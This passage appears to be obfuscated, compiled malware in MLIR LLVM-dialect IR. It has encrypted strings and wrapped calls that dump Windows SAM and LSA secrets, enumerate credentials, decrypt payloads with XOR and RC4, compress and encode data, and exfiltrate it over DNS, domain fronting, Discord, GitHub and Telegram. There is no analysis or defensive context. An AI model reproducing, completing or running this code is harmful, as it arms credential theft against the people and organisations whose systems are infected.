    %0 = llvm.mlir.addressof @".str.34.enc" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.constant(1 : i32) : i32
    %3 = llvm.mlir.addressof @g_9f9def0f : !llvm.ptr
    %4 = llvm.mlir.constant(0 : i64) : i64
    %5 = llvm.mlir.constant(6 : i64) : i64
    %6 = llvm.mlir.addressof @".str.36.enc" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.37.enc" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.18.enc" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.35.enc" : !llvm.ptr
    %10 = llvm.mlir.constant(1 : i64) : i64
    %11 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.call @__obfs_wrap_println(%11) : (!llvm.ptr) -> ()
    %12 = llvm.alloca %2 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    llvm.store %1, %12 {alignment = 4 : i64} : i32, !llvm.ptr
    %13 = llvm.load %3 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %14 = llvm.alloca %2 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %4, %14 {alignment = 8 : i64} : i64, !llvm.ptr
    %15 = llvm.alloca %2 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.br ^bb1
  ^bb1:  // 2 preds: ^bb0, ^bb5
    %16 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> i64
    %17 = llvm.icmp "slt" %16, %5 : i64
    llvm.cond_br %17, ^bb2, ^bb6
  ^bb2:  // pred: ^bb1
    %18 = llvm.bitcast %13 : !llvm.ptr to !llvm.ptr
    %19 = llvm.getelementptr %18[%16] : (!llvm.ptr, i64) -> !llvm.ptr, !llvm.ptr
    %20 = llvm.load %19 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %20, %15 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %21 = llvm.load %15 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %22 = llvm.call @__obfs_wrap_fs_exists(%21) : (!llvm.ptr) -> i1
    llvm.cond_br %22, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %23 = llvm.load %12 {alignment = 4 : i64} : !llvm.ptr -> i32
    %24 = llvm.add %23, %2 : i32
    llvm.store %24, %12 {alignment = 4 : i64} : i32, !llvm.ptr
    %25 = llvm.getelementptr %9[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    %26 = llvm.load %15 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %27 = llvm.call @__obfs_wrap_jocky_str_concat(%25, %26) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @__obfs_wrap_println(%27) : (!llvm.ptr) -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    llvm.br ^bb5
  ^bb5:  // pred: ^bb4
    %28 = llvm.add %16, %10 : i64
    llvm.store %28, %14 {alignment = 8 : i64} : i64, !llvm.ptr
    llvm.br ^bb1
  ^bb6:  // pred: ^bb1
    %29 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    %30 = llvm.load %12 {alignment = 4 : i64} : !llvm.ptr -> i32
    %31 = llvm.sext %30 : i32 to i64
    %32 = llvm.call @__obfs_wrap_string(%31) : (i64) -> !llvm.ptr
    %33 = llvm.call @__obfs_wrap_jocky_str_concat(%29, %32) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %34 = llvm.getelementptr %7[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<14 x i8>
    %35 = llvm.call @__obfs_wrap_jocky_str_concat(%33, %34) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @__obfs_wrap_println(%35) : (!llvm.ptr) -> ()
    %36 = llvm.getelementptr %8[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @__obfs_wrap_println(%36) : (!llvm.ptr) -> ()
    %37 = llvm.load %12 {alignment = 4 : i64} : !llvm.ptr -> i32
    %38 = llvm.icmp "sgt" %37, %1 : i32
    llvm.return %38 : i1
  }
  llvm.func @f_8ec13d7c68d1() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.38.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.39.enc" : !llvm.ptr
    %4 = llvm.mlir.constant(true) : i1
    %5 = llvm.mlir.addressof @".str.18.enc" : !llvm.ptr
    %6 = llvm.mlir.addressof @g_e47349ba : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.40.enc" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.27.enc" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.41.enc" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.42.enc" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.43.enc" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.44.enc" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.45.enc" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.46.enc" : !llvm.ptr
    %15 = llvm.mlir.constant(32 : i32) : i32
    %16 = llvm.mlir.addressof @".str.47.enc" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.48.enc" : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.49.enc" : !llvm.ptr
    %19 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %20 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %21 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %22 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %23 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<41 x i8>
    llvm.call @__obfs_wrap_println(%23) : (!llvm.ptr) -> ()
    %24 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    %25 = llvm.call @__obfs_wrap_fs_list_files(%24, %4) : (!llvm.ptr, i1) -> !llvm.ptr
    llvm.store %25, %19 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %26 = llvm.load %19 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %27 = llvm.call @__obfs_wrap_strlen(%26) : (!llvm.ptr) -> i64
    %28 = llvm.sext %2 : i32 to i64
    %29 = llvm.icmp "sgt" %27, %28 : i64
    llvm.cond_br %29, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %30 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %31 = llvm.load %19 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %32 = llvm.call @__obfs_wrap_jocky_str_concat(%30, %31) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %32, %6 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %33 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<20 x i8>
    %34 = llvm.load %19 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %35 = llvm.call @__obfs_wrap_strlen(%34) : (!llvm.ptr) -> i64
    %36 = llvm.call @__obfs_wrap_string(%35) : (i64) -> !llvm.ptr
    %37 = llvm.call @__obfs_wrap_jocky_str_concat(%33, %36) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %38 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %39 = llvm.call @__obfs_wrap_jocky_str_concat(%37, %38) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @__obfs_wrap_println(%39) : (!llvm.ptr) -> ()
    llvm.br ^bb2
  ^bb2:  // 2 preds: ^bb0, ^bb1
    %40 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    %41 = llvm.call @__obfs_wrap_fs_list_files(%40, %4) : (!llvm.ptr, i1) -> !llvm.ptr
    llvm.store %41, %20 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %42 = llvm.load %20 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %43 = llvm.call @__obfs_wrap_strlen(%42) : (!llvm.ptr) -> i64
    %44 = llvm.sext %2 : i32 to i64
    %45 = llvm.icmp "sgt" %43, %44 : i64
    llvm.cond_br %45, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %46 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %47 = llvm.load %20 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %48 = llvm.call @__obfs_wrap_jocky_str_concat(%46, %47) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %48, %6 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %49 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<20 x i8>
    %50 = llvm.load %20 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %51 = llvm.call @__obfs_wrap_strlen(%50) : (!llvm.ptr) -> i64
    %52 = llvm.call @__obfs_wrap_string(%51) : (i64) -> !llvm.ptr
    %53 = llvm.call @__obfs_wrap_jocky_str_concat(%49, %52) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %54 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %55 = llvm.call @__obfs_wrap_jocky_str_concat(%53, %54) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @__obfs_wrap_println(%55) : (!llvm.ptr) -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    %56 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<24 x i8>
    %57 = llvm.call @__obfs_wrap_fs_list_files(%56, %4) : (!llvm.ptr, i1) -> !llvm.ptr
    llvm.store %57, %21 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %58 = llvm.load %21 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %59 = llvm.call @__obfs_wrap_strlen(%58) : (!llvm.ptr) -> i64
    %60 = llvm.sext %2 : i32 to i64
    %61 = llvm.icmp "sgt" %59, %60 : i64
    llvm.cond_br %61, ^bb5, ^bb6
  ^bb5:  // pred: ^bb4
    %62 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %63 = llvm.load %21 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %64 = llvm.call @__obfs_wrap_jocky_str_concat(%62, %63) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %64, %6 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %65 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %66 = llvm.load %21 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %67 = llvm.call @__obfs_wrap_strlen(%66) : (!llvm.ptr) -> i64
    %68 = llvm.call @__obfs_wrap_string(%67) : (i64) -> !llvm.ptr
    %69 = llvm.call @__obfs_wrap_jocky_str_concat(%65, %68) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %70 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %71 = llvm.call @__obfs_wrap_jocky_str_concat(%69, %70) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @__obfs_wrap_println(%71) : (!llvm.ptr) -> ()
    llvm.br ^bb6
  ^bb6:  // 2 preds: ^bb4, ^bb5
    %72 = llvm.call @__obfs_wrap_jocky_registry_dump_sam() : () -> i32
    %73 = llvm.icmp "sgt" %72, %2 : i32
    llvm.cond_br %73, ^bb7, ^bb8
  ^bb7:  // pred: ^bb6
    %74 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    llvm.call @__obfs_wrap_println(%74) : (!llvm.ptr) -> ()
    llvm.br ^bb8
  ^bb8:  // 2 preds: ^bb6, ^bb7
    %75 = llvm.call @__obfs_wrap_jocky_registry_dump_lsa_secrets() : () -> i32
    %76 = llvm.icmp "sgt" %75, %2 : i32
    llvm.cond_br %76, ^bb9, ^bb10
  ^bb9:  // pred: ^bb8
    %77 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
    llvm.call @__obfs_wrap_println(%77) : (!llvm.ptr) -> ()
    llvm.br ^bb10
  ^bb10:  // 2 preds: ^bb8, ^bb9
    %78 = llvm.call @__obfs_wrap_jocky_credentials_enumerate() : () -> !llvm.ptr
    llvm.store %78, %22 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %79 = llvm.load %22 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %80 = llvm.call @__obfs_wrap_jocky_data_hex_encode(%79, %15) : (!llvm.ptr, i32) -> !llvm.ptr
    %81 = llvm.call @__obfs_wrap_strlen(%80) : (!llvm.ptr) -> i64
    %82 = llvm.sext %2 : i32 to i64
    %83 = llvm.icmp "sgt" %81, %82 : i64
    llvm.cond_br %83, ^bb11, ^bb12
  ^bb11:  // pred: ^bb10
    %84 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @__obfs_wrap_println(%84) : (!llvm.ptr) -> ()
    llvm.br ^bb12
  ^bb12:  // 2 preds: ^bb10, ^bb11
    %85 = llvm.getelementptr %17[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<22 x i8>
    %86 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %87 = llvm.call @__obfs_wrap_strlen(%86) : (!llvm.ptr) -> i64
    %88 = llvm.call @__obfs_wrap_string(%87) : (i64) -> !llvm.ptr
    %89 = llvm.call @__obfs_wrap_jocky_str_concat(%85, %88) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %90 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<22 x i8>
    %91 = llvm.call @__obfs_wrap_jocky_str_concat(%89, %90) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @__obfs_wrap_println(%91) : (!llvm.ptr) -> ()
    %92 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @__obfs_wrap_println(%92) : (!llvm.ptr) -> ()
    %93 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %94 = llvm.call @__obfs_wrap_strlen(%93) : (!llvm.ptr) -> i64
    %95 = llvm.sext %2 : i32 to i64
    %96 = llvm.icmp "sgt" %94, %95 : i64
    llvm.return %96 : i1
  }
  llvm.func @f_4837c8659494() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.50.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.18.enc" : !llvm.ptr
    %4 = llvm.mlir.constant(66 : i32) : i32
    %5 = llvm.mlir.addressof @".str.51.enc" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.52.enc" : !llvm.ptr
    %7 = llvm.mlir.constant(6 : i32) : i32
    %8 = llvm.mlir.addressof @".str.53.enc" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.54.enc" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.55.enc" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.27.enc" : !llvm.ptr
    %12 = llvm.mlir.constant(true) : i1
    %13 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %14 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %15 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.call @__obfs_wrap_println(%15) : (!llvm.ptr) -> ()
    %16 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %17 = llvm.call @__obfs_wrap_strlen(%16) : (!llvm.ptr) -> i64
    %18 = llvm.sext %2 : i32 to i64
    %19 = llvm.icmp "sgt" %17, %18 : i64
    llvm.cond_br %19, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %20 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %21 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %22 = llvm.call @__obfs_wrap_strlen(%21) : (!llvm.ptr) -> i64
    %23 = llvm.trunc %22 : i64 to i32
    %24 = llvm.trunc %4 : i32 to i8
    llvm.call @__obfs_wrap_jocky_decrypt_xor(%20, %23, %24, %0) : (!llvm.ptr, i32, i8, i32) -> ()
    %25 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @__obfs_wrap_println(%25) : (!llvm.ptr) -> ()
    %26 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %27 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %28 = llvm.call @__obfs_wrap_strlen(%27) : (!llvm.ptr) -> i64
    %29 = llvm.trunc %28 : i64 to i32
    %30 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    llvm.call @__obfs_wrap_jocky_decrypt_rc4(%26, %29, %30, %7) : (!llvm.ptr, i32, !llvm.ptr, i32) -> ()
    %31 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @__obfs_wrap_println(%31) : (!llvm.ptr) -> ()
    %32 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %33 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %34 = llvm.call @__obfs_wrap_strlen(%33) : (!llvm.ptr) -> i64
    %35 = llvm.trunc %34 : i64 to i32
    %36 = llvm.call @__obfs_wrap_jocky_compress_data(%32, %35) : (!llvm.ptr, i32) -> !llvm.ptr
    llvm.store %36, %13 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %37 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<24 x i8>
    llvm.call @__obfs_wrap_println(%37) : (!llvm.ptr) -> ()
    %38 = llvm.load %13 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %39 = llvm.load %13 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %40 = llvm.call @__obfs_wrap_strlen(%39) : (!llvm.ptr) -> i64
    %41 = llvm.trunc %40 : i64 to i32
    %42 = llvm.call @__obfs_wrap_jocky_data_base64_encode(%38, %41) : (!llvm.ptr, i32) -> !llvm.ptr
    llvm.store %42, %14 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %43 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<25 x i8>
    %44 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %45 = llvm.call @__obfs_wrap_strlen(%44) : (!llvm.ptr) -> i64
    %46 = llvm.call @__obfs_wrap_string(%45) : (i64) -> !llvm.ptr
    %47 = llvm.call @__obfs_wrap_jocky_str_concat(%43, %46) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %48 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %49 = llvm.call @__obfs_wrap_jocky_str_concat(%47, %48) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @__obfs_wrap_println(%49) : (!llvm.ptr) -> ()
    llvm.br ^bb2
  ^bb2:  // 2 preds: ^bb0, ^bb1
    %50 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @__obfs_wrap_println(%50) : (!llvm.ptr) -> ()
    llvm.return %12 : i1
  }
  llvm.func @f_20b3ef7cd0d6() -> i1 {
    %0 = llvm.mlir.addressof @".str.56.enc" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.18.enc" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.58.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.59.enc" : !llvm.ptr
    %5 = llvm.mlir.constant(4096 : i32) : i32
    %6 = llvm.mlir.addressof @".str.60.enc" : !llvm.ptr
    %7 = llvm.mlir.constant(256 : i32) : i32
    %8 = llvm.mlir.addressof @".str.61.enc" : !llvm.ptr
    %9 = llvm.mlir.constant(2000 : i32) : i32
    %10 = llvm.mlir.addressof @".str.62.enc" : !llvm.ptr
    %11 = llvm.mlir.constant(1024 : i32) : i32
    %12 = llvm.mlir.addressof @".str.63.enc" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.64.enc" : !llvm.ptr
    %14 = llvm.mlir.constant(512 : i32) : i32
    %15 = llvm.mlir.addressof @".str.65.enc" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.66.enc" : !llvm.ptr
    %17 = llvm.mlir.constant(true) : i1
    %18 = llvm.mlir.addressof @".str.57.enc" : !llvm.ptr
    %19 = llvm.mlir.constant(false) : i1
    %20 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<39 x i8>
    llvm.call @__obfs_wrap_println(%20) : (!llvm.ptr) -> ()
    %21 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %22 = llvm.call @__obfs_wrap_strlen(%21) : (!llvm.ptr) -> i64
    %23 = llvm.sext %1 : i32 to i64
    %24 = llvm.icmp "eq" %22, %23 : i64
    llvm.cond_br %24, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %25 = llvm.getelementptr %18[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.call @__obfs_wrap_println(%25) : (!llvm.ptr) -> ()
    llvm.return %19 : i1
  ^bb2:  // pred: ^bb0
    %26 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %27 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %28 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %29 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<5 x i8>
    %30 = llvm.call @__obfs_wrap_jocky_exfil_front(%26, %27, %28, %29, %5) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.cond_br %30, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %31 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @__obfs_wrap_println(%31) : (!llvm.ptr) -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    %32 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %33 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %34 = llvm.call @__obfs_wrap_jocky_exfil_dns(%32, %33, %7) : (!llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.cond_br %34, ^bb5, ^bb6
  ^bb5:  // pred: ^bb4
    %35 = llvm.getelementptr %8[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<43 x i8>
    llvm.call @__obfs_wrap_println(%35) : (!llvm.ptr) -> ()
    llvm.br ^bb6
  ^bb6:  // 2 preds: ^bb4, ^bb5
    %36 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %37 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %38 = llvm.call @__obfs_wrap_jocky_exfil_discord(%36, %37, %9) : (!llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.cond_br %38, ^bb7, ^bb8
  ^bb7:  // pred: ^bb6
    %39 = llvm.getelementptr %10[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.call @__obfs_wrap_println(%39) : (!llvm.ptr) -> ()
    llvm.br ^bb8
  ^bb8:  // 2 preds: ^bb6, ^bb7
    %40 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %41 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %42 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %43 = llvm.call @__obfs_wrap_jocky_exfil_github(%40, %41, %42, %11) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.cond_br %43, ^bb9, ^bb10
  ^bb9:  // pred: ^bb8
    %44 = llvm.getelementptr %12[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<39 x i8>
    llvm.call @__obfs_wrap_println(%44) : (!llvm.ptr) -> ()
    llvm.br ^bb10
  ^bb10:  // 2 preds: ^bb8, ^bb9
    %45 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %46 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %47 = llvm.getelementptr %13[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    %48 = llvm.call @__obfs_wrap_jocky_exfil_telegram(%45, %46, %47, %14) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.cond_br %48, ^bb11, ^bb12
  ^bb11:  // pred: ^bb10
    %49 = llvm.getelementptr %15[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<41 x i8>
    llvm.call @__obfs_wrap_println(%49) : (!llvm.ptr) -> ()
    llvm.br ^bb12
  ^bb12:  // 2 preds: ^bb10, ^bb11
    %50 = llvm.getelementptr %16[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.call @__obfs_wrap_println(%50) : (!llvm.ptr) -> ()
    %51 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @__obfs_wrap_println(%51) : (!llvm.ptr) -> ()
    llvm.return %17 : i1
  }
  llvm.func @f_e5af34996946() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.67.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @g_3cddc28a : !llvm.ptr
    %4 = llvm.mlir.constant(0 : i64) : i64
    %5 = llvm.mlir.addressof @".str.71.enc" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.18.enc" : !llvm.ptr
    %7 = llvm.mlir.constant(false) : i1
    %8 = llvm.mlir.addressof @".str.68.enc" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.69.enc" : !llvm.ptr
    %10 = llvm.mlir.constant(1 : i64) : i64
    %11 = llvm.mlir.addressof @".str.70.enc" : !llvm.ptr
    %12 = llvm.mlir.constant(true) : i1
    %13 = llvm.mlir.addressof @kernel_access : !llvm.ptr
    %14 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %15 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<44 x i8>
    llvm.call @__obfs_wrap_println(%15) : (!llvm.ptr) -> ()
